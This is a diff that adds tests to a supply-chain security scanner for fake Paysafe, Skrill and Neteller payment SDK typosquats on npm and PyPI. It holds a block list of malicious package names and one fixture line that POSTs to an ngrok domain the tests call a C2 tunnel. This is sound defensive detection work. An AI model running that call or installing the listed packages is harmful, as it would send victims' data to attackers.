@@ -2184,4 +2184,75 @@ describe("Campaign Signatures", () => {
       expect(finding?.severity).toBe("critical");
     });
   });
+
+  // =================================================================
+  //  Fake Paysafe / Skrill / Neteller payment SDKs (Socket, July 8, 2026)
+  // =================================================================
+
+  describe("Fake Payment SDK Typosquat (July 2026)", () => {
+    const NPM_NAMES = [
+      "paysafe-checkout", "paysafe-vault", "paysafe-js", "paysafe-api",
+      "paysafe-node", "paysafe-cards", "paysafe-fraud", "paysafe-kyc",
+      "paysafe-payments", "skrill", "skrill-sdk", "skrill-payments", "neteller",
+    ];
+    const PYPI_NAMES = ["paysafe-kyc", "paysafe-payments", "paysafe-sdk", "paysafe-api"];
+
+    it("matches every fake npm SDK name against the malicious-name patterns", () => {
+      for (const name of NPM_NAMES) {
+        const hit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
+        expect(hit, name).toBe(true);
+      }
+    });
+
+    it("matches every fake PyPI SDK name, incl. the underscore form", () => {
+      for (const name of [...PYPI_NAMES, "paysafe_kyc", "paysafe_sdk"]) {
+        const hit = PYPI_TYPOSQUAT_PATTERNS.some((p) => new RegExp(p).test(name));
+        expect(hit, name).toBe(true);
+      }
+    });
+
+    it("does NOT match legitimate neighbouring names (anchored, no FP)", () => {
+      const legit = ["paysafe-sdk-wrapper", "my-skrill", "neteller-utils", "paysafe", "skrillex"];
+      for (const name of legit) {
+        const npmHit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
+        const pyHit = PYPI_TYPOSQUAT_PATTERNS.some((p) => new RegExp(p).test(name));
+        expect(npmHit || pyHit, name).toBe(false);
+      }
+    });
+
+    it("flags a directory scan whose package.json depends on a fake SDK", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "package.json"),
+        JSON.stringify({ name: "app", version: "1.0.0", dependencies: { "skrill-sdk": "1.0.2" } }),
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      const dep = report.findings.find((f) => f.rule === "MALICIOUS_DEPENDENCY");
+      expect(dep).toBeDefined();
+      expect(dep?.match).toBe("skrill-sdk");
+    });
+
+    it("does NOT flag a legitimate dependency (dir-scan FP guard)", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "package.json"),
+        JSON.stringify({ name: "app", version: "1.0.0", dependencies: { "left-pad": "1.3.0", "paysafe-sdk-wrapper": "2.0.0" } }),
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.some((f) => f.rule === "MALICIOUS_DEPENDENCY")).toBe(false);
+    });
+
+    it("flags the ngrok C2 tunnel in package code", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "index.js"),
+        'fetch("https://caliber-spinner-finishing.ngrok-free.dev", { method: "POST" });',
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.some((f) => f.rule === "IOC_KNOWN_C2_DOMAIN")).toBe(true);
+    });
+
+    it("the install guard blocks a fake SDK before npm runs", async () => {
+      const { analyzeInstallCommand } = await import("../install-guard.js");
+      expect(analyzeInstallCommand("npm", ["install", "skrill-sdk"]).blocked).toBe(true);
+      expect(analyzeInstallCommand("npm", ["install", "paysafe-vault@1.0.3"]).blocked).toBe(true);
+    });
+  });
 });
